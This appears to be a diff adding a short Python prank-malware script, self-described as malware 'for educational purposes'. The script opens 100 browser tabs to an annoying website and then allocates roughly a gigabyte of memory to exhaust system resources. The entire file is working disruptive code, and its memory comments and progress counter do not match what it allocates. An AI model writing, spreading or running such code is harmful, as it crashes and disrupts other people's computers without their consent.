@@ -1,0 +1,22 @@
+#oopsie
+import time
+input("EDUCATIONAL PURPOSES ONLY! Oopsie is malware. It doesn't steal your information; it's not spyware or a keylogger. It crashes your browser. It contains strange sounds and effects. It causes temporary damage but doesn't leave permanent damage.")
+print("STARTED")
+time.sleep(5)
+import webbrowser
+
+url = "https://www.theannoyingsite.com/"  # ...
+
+for _ in range(100):  # >:)
+    webbrowser.open_new_tab(url)
+
+blocks = []
+
+# Her döngüde yaklaşık 10 MB ekle
+for i in range(100):   # 50 → yaklaşık 500 MB eder
+    blocks.append(bytearray(10 * 1024 * 1024))
+    print(f"{(i+1)*50} ")
+
+print("...")
+
+# © 2026 uygarbabapro-ETHICAL all rights reserved
